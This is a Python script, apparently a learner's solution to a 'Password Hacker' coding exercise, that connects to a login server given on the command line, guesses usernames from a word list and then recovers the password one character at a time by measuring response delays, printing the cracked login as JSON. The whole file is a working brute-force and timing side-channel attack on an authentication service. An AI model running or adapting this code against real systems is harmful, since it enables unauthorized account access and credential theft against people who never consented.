# write your code here
import random
import socket
import itertools
# creating the socket
import sys
import json
from string import ascii_lowercase, digits, ascii_uppercase
from datetime import datetime
from time import sleep

passes = []
logins = []
all_passes = []
fil = 0


def get_passes():
    global fil
    passes.clear()
    all_passes.clear()
    with open("C:\\Users\\Rodrigo\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\passwords.txt",
              "r") as f:
        for line in f:
            passes.append(line.replace("\n", ""))
    for i in range(len(passes)):
        pas = map(''.join, itertools.product(*zip(passes[i].upper(), passes[i].lower())))
        for x in pas:
            all_passes.append(x)
    with open(f"{passes[i].lower()}.txt", "w") as f:
        for a in range(len(all_passes)):
            f.write(all_passes[a] + "\n")


def get_logins():
    logins.clear()
    with open("C:\\Users\\Rodrigo\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt",
              "r") as f:
        for line in f:
            logins.append(line.replace("\n", ""))


def create(hostname, port):
    client_socket = socket.socket()
    hostname = hostname
    port = int(port)
    address = (hostname, port)
    client_socket.connect(address)
    return client_socket


def try_login(sock):
    get_logins()
    for x in range(len(logins)):
        sock.send(json.dumps({'login': f'{logins[x]}', "password": " "}).encode('utf8'))
        response = sock.recv(1024)
        try:
            result = json.loads(response.decode('utf8'))['result']
            if result == "Wrong password!":
                return logins[x]
            elif result == "Too many attempts to connect!":
                sock.close()
                exit()
        except:
            sock.close()
            exit()


def try_passes(sock, login):
    password = ""
    tudo = ascii_lowercase + digits + ascii_uppercase
    t = 0
    while t < 1000:
        tentativa = tudo[t]
        start = datetime.now()
        sock.send(json.dumps({'login': f'{login}', "password": f"{password + tentativa}"}).encode('utf8'))
        response = sock.recv(1024)
        finish = datetime.now()
        try:
            result = json.loads(response.decode('utf8'))['result']
            difference = finish - start
            difference_aux = str(difference).replace(":", "")
            if difference_aux.__contains__("."):
                difference_aux = difference_aux.replace(".", "")
            diferenca = int(difference_aux) > 100000
            if result == "Wrong password!" and diferenca:
                password += tentativa
            elif result == "Connection success!":
                password += tentativa
                return password
            elif result == "Too many attempts to connect!":
                sock.close()
                exit()
            else:
                pass
        except:
            sock.close()
            exit()
        if t == 61:
            t = 0
        else:
            t += 1


def inicia_conexao():
    args = sys.argv
    hostname = args[1]
    port = args[2]
    sock = create(hostname, port)
    start = datetime.now()
    login = try_login(sock)
    password = try_passes(sock, login)
    json_data = {"login": f"{login}", "password": f"{password}"}
    data = json.dumps(json_data)
    print(data)
    finish = datetime.now()
    difference = finish - start
    # print(difference)
    sock.close()
    exit()


def valida_senha(sock, password):
    password = password.encode()
    sock.send(password)
    response = sock.recv(1024)
    response = response.decode()
    if response == "Connection success!":
        return True
    elif response == "Too many attempts to connect!":
        sock.close()
        exit()
    else:
        return False


inicia_conexao()
